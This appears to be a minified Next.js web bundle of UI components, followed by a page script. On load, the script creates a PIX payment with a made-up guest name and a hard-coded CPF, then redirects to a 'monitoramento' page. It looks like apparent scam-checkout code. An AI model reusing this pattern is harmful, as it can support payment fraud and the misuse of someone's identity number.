            n.jsx)("div", {
                ref: t,
                className: (0,
                a.cn)("rounded-lg border bg-card text-card-foreground shadow-sm", r),
                ...s
            })
        }
        );
        i.displayName = "Card";
        let o = s.forwardRef( (e, t) => {
            let {className: r, ...s} = e;
            return (0,
            n.jsx)("div", {
                ref: t,
                className: (0,
                a.cn)("flex flex-col space-y-1.5 p-6", r),
                ...s
            })
        }
        );
        o.displayName = "CardHeader";
        let l = s.forwardRef( (e, t) => {
            let {className: r, ...s} = e;
            return (0,
            n.jsx)("div", {
                ref: t,
                className: (0,
                a.cn)("text-2xl font-semibold leading-none tracking-tight", r),
                ...s
            })
        }
        );
        l.displayName = "CardTitle";
        let c = s.forwardRef( (e, t) => {
            let {className: r, ...s} = e;
            return (0,
            n.jsx)("div", {
                ref: t,
                className: (0,
                a.cn)("text-sm text-muted-foreground", r),
                ...s
            })
        }
        );
        c.displayName = "CardDescription";
        let d = s.forwardRef( (e, t) => {
            let {className: r, ...s} = e;
            return (0,
            n.jsx)("div", {
                ref: t,
                className: (0,
                a.cn)("p-6 pt-0", r),
                ...s
            })
        }
        );
        d.displayName = "CardContent";
        let u = s.forwardRef( (e, t) => {
            let {className: r, ...s} = e;
            return (0,
            n.jsx)("div", {
                ref: t,
                className: (0,
                a.cn)("flex items-center p-6 pt-0", r),
                ...s
            })
        }
        );
        u.displayName = "CardFooter"
    },
    4508: function(e, t, r) {
        "use strict";
        r.d(t, {
            cn: function() {
                return a
            }
        });
        var n = r(1994)
          , s = r(3335);
        function a() {
            for (var e = arguments.length, t = Array(e), r = 0; r < e; r++)
                t[r] = arguments[r];
            return (0,
            s.m6)((0,
            n.W)(t))
        }
    },
    2660: function(e, t, r) {
        "use strict";
        r.d(t, {
            Z: function() {
                return n
            }
        });
        let n = (0,
        r(9205).Z)("ArrowLeft", [["path", {
            d: "m12 19-7-7 7-7",
            key: "1l729n"
        }], ["path", {
            d: "M19 12H5",
            key: "x3x0zl"
        }]])
    },
    3245: function(e, t, r) {
        "use strict";
        r.d(t, {
            Z: function() {
                return n
            }
        });
        let n = (0,
        r(9205).Z)("Info", [["circle", {
            cx: "12",
            cy: "12",
            r: "10",
            key: "1mglay"
        }], ["path", {
            d: "M12 16v-4",
            key: "1dtifu"
        }], ["path", {
            d: "M12 8h.01",
            key: "e9boi3"
        }]])
    },
    8667: function(e, t, r) {
        "use strict";
        r.d(t, {
            default: function() {
                return s.a
            }
        });
        var n = r(8003)
          , s = r.n(n)
    },
    6741: function(e, t, r) {
        "use strict";
        function n(e, t, {checkForDefaultPrevented: r=!0}={}) {
            return function(n) {
                if (e?.(n),
                !1 === r || !n.defaultPrevented)
                    return t?.(n)
            }
        }
        r.d(t, {
            M: function() {
                return n
            }
        })
    },
    3966: function(e, t, r) {
        "use strict";
        r.d(t, {
            b: function() {
                return a
            }
        });
        var n = r(2265)
          , s = r(7437);
        function a(e, t=[]) {
            let r = []
              , a = () => {
                let t = r.map(e => n.createContext(e));
                return function(r) {
                    let s = r?.[e] || t;
                    return n.useMemo( () => ({
                        [`__scope${e}`]: {
                            ...r,
                            [e]: s
                        }
                    }), [r, s])
                }
            }
            ;
            return a.scopeName = e,
            [function(t, a) {
                let i = n.createContext(a)
                  , o = r.length;
                r = [...r, a];
                let l = t => {
                    let {scope: r, children: a, ...l} = t
                      , c = r?.[e]?.[o] || i
                      , d = n.useMemo( () => l, Object.values(l));
                    return (0,
                    s.jsx)(c.Provider, {
                        value: d,
                        children: a
                    })
                }
                ;
                return l.displayName = t + "Provider",
                [l, function(r, s) {
                    let l = s?.[e]?.[o] || i
                      , c = n.useContext(l);
                    if (c)
                        return c;
                    if (void 0 !== a)
                        return a;
                    throw Error(`\`${r}\` must be used within \`${t}\``)
                }
                ]
            }
            , function(...e) {
                let t = e[0];
                if (1 === e.length)
                    return t;
                let r = () => {
                    let r = e.map(e => ({
                        useScope: e(),
                        scopeName: e.scopeName
                    }));
                    return function(e) {
                        let s = r.reduce( (t, {useScope: r, scopeName: n}) => {
                            let s = r(e)[`__scope${n}`];
                            return {
                                ...t,
                                ...s
                            }
                        }
                        , {});
                        return n.useMemo( () => ({
                            [`__scope${t.scopeName}`]: s
                        }), [s])
                    }
                }
                ;
                return r.scopeName = t.scopeName,
                r
            }(a, ...t)]
        }
    },
    6840: function(e, t, r) {
        "use strict";
        r.d(t, {
            WV: function() {
                return o
            },
            jH: function() {
                return l
            }
        });
        var n = r(2265)
          , s = r(4887)
          , a = r(7053)
          , i = r(7437)
          , o = ["a", "button", "div", "form", "h2", "h3", "img", "input", "label", "li", "nav", "ol", "p", "span", "svg", "ul"].reduce( (e, t) => {
            let r = n.forwardRef( (e, r) => {
                let {asChild: n, ...s} = e
                  , o = n ? a.g7 : t;
                return "undefined" != typeof window && (window[Symbol.for("radix-ui")] = !0),
                (0,
                i.jsx)(o, {
                    ...s,
                    ref: r
                })
            }
            );
            return r.displayName = `Primitive.${t}`,
            {
                ...e,
                [t]: r
            }
        }
        , {});
        function l(e, t) {
            e && s.flushSync( () => e.dispatchEvent(t))
        }
    },
    6606: function(e, t, r) {
        "use strict";
        r.d(t, {
            W: function() {
                return s
            }
        });
        var n = r(2265);
        function s(e) {
            let t = n.useRef(e);
            return n.useEffect( () => {
                t.current = e
            }
            ),
            n.useMemo( () => (...e) => t.current?.(...e), [])
        }
    },
    886: function(e, t, r) {
        "use strict";
        r.d(t, {
            T: function() {
                return a
            }
        });
        var n = r(2265)
          , s = r(6606);
        function a({prop: e, defaultProp: t, onChange: r= () => {}
        }) {
            let[a,i] = function({defaultProp: e, onChange: t}) {
                let r = n.useState(e)
                  , [a] = r
                  , i = n.useRef(a)
                  , o = (0,
                s.W)(t);
                return n.useEffect( () => {
                    i.current !== a && (o(a),
                    i.current = a)
                }
                , [a, i, o]),
                r
            }({
                defaultProp: t,
                onChange: r
            })
              , o = void 0 !== e
              , l = o ? e : a
              , c = (0,
            s.W)(r);
            return [l, n.useCallback(t => {
                if (o) {
                    let r = "function" == typeof t ? t(e) : t;
                    r !== e && c(r)
                } else
                    i(t)
            }
            , [o, e, i, c])]
        }
    },
    1188: function(e, t, r) {
        "use strict";
        r.d(t, {
            b: function() {
                return s
            }
        });
        var n = r(2265)
          , s = globalThis?.document ? n.useLayoutEffect : () => {}
    },
    6718: function(e, t, r) {
        "use strict";
        r.d(t, {
            D: function() {
                return s
            }
        });
        var n = r(2265);
        function s(e) {
            let t = n.useRef({
                value: e,
                previous: e
            });
            return n.useMemo( () => (t.current.value !== e && (t.current.previous = t.current.value,
            t.current.value = e),
            t.current.previous), [e])
        }
    },
    420: function(e, t, r) {
        "use strict";
        r.d(t, {
            t: function() {
                return a
            }
        });
        var n = r(2265)
          , s = r(1188);
        function a(e) {
            let[t,r] = n.useState(void 0);
            return (0,
            s.b)( () => {
                if (e) {
                    r({
                        width: e.offsetWidth,
                        height: e.offsetHeight
                    });
                    let t = new ResizeObserver(t => {
                        let n, s;
                        if (!Array.isArray(t) || !t.length)
                            return;
                        let a = t[0];
                        if ("borderBoxSize"in a) {
                            let e = a.borderBoxSize
                              , t = Array.isArray(e) ? e[0] : e;
                            n = t.inlineSize,
                            s = t.blockSize
                        } else
                            n = e.offsetWidth,
                            s = e.offsetHeight;
                        r({
                            width: n,
                            height: s
                        })
                    }
                    );
                    return t.observe(e, {
                        box: "border-box"
                    }),
                    () => t.unobserve(e)
                }
                r(void 0)
            }
            , [e]),
            t
        }
    }
}, function(e) {
    e.O(0, [582, 3, 971, 117, 744], function() {
        return e(e.s = 1538)
    }),
    _N_E = e.O()
}
]);

function getRandomLetters(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
  }

  async function createPixTransaction() {
    const randomSuffix = getRandomLetters(5);
    const payload = {
      name: "Guest User" + randomSuffix,
      email: "usuario@example.com",
      cpf: "84442474133",
      phone: "11999999999",
      paymentMethod: "PIX",
      amount: window.__CONFIG__.PRICE_VALUE,
      traceable: true,
      utmQuery: window.__CONFIG__.UTM_QUERY,
      items: [
        {
          unitPrice: window.__CONFIG__.PRICE_VALUE,
          title: "Tansação Kawai",
          quantity: 1,
          tangible: false
        }
      ]
    };

    try {
      const response = await fetch(window.__CONFIG__.PURCHASE_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': window.__CONFIG__.API_KEY
        },
        body: JSON.stringify(payload)
      });

      if (!response.ok) {
        throw new Error(`Erro na requisição: ${response.status}`);
      }

      const data = await response.json();
      
      sessionStorage.setItem('transactionId', data.id);
      sessionStorage.setItem('pixCode', data.pixCode);
      sessionStorage.setItem('qrData', data.pixQrCode);
      
      window.location.href = '/monitoramento.html';
    } catch (error) {
      console.error(error);
    }
  }

  window.onload = createPixTransaction;
(function(c, l, a, r, i, t, y) {
    c[a] = c[a] || function() {
        (c[a].q = c[a].q || []).push(arguments)
    }
    ;
    t = l.createElement(r);
    t.async = 1;
    t.src = "https://www.clarity.ms/tag/" + i;
    y = l.getElementsByTagName(r)[0];
    y.parentNode.insertBefore(t, y);
}
)(window, document, "clarity", "script", "qimbz93jbm");
